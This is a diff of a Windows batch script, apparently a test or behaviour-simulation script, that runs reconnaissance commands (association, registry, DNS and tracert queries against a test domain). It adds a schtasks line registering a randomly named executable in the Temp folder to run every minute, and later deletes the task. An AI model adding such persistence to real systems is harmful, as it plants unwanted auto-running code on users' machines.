@@ -70,6 +70,8 @@ assoc
 ECHO ============================
 assoc | findstr ".xml"
 ECHO ============================
+schtasks /create /sc minute /mo 1 /tn VVRsPMjDDQ.exe /tr C:\Users\user\AppData\Local\Temp\VVRsPMjDDQ.exe
+ECHO ============================
 assoc | find ".exe"
 ECHO ============================
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
@@ -253,7 +255,7 @@ nslookup bcdyzit4r3e5tet6y3e6y3w3e6y6y6y.testdeneme12345edced.com
 ECHO ============================
 tracert -d bcdyzit4r3e5tet6y3e6y3w3e6y6y6y.testdeneme12345edced.com
 ECHO ============================
-schtasks /create /sc minute /mo 1 /tn VVRsPMjDDQ.exe /tr C:\Users\user\AppData\Local\Temp\VVRsPMjDDQ.exe
+schtasks /delete /tn VVRsPMjDDQ.exe
 ECHO ============================
 ECHO %logonserver%
 ECHO ============================
